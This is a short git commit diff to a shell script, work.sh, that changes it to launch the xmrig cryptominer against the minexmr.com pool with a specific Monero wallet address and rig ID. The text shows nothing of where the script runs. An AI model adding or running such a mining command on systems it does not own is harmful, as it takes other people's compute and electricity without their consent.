be2750af9300badabe319b9304463894b788acac
Lanawoods21 <103140836+Lanawoods21@users.noreply.github.com>
2022-04-07 03:31:48 +0530

    Update work.sh

--- work.sh
+++ work.sh
@@ -9,4 +9,5 @@
 #cd xmrig-6.16.4
 #./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id Main
 chmod u+r+x xmrig
-./xmrig
+./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id N1
+#./xmrig
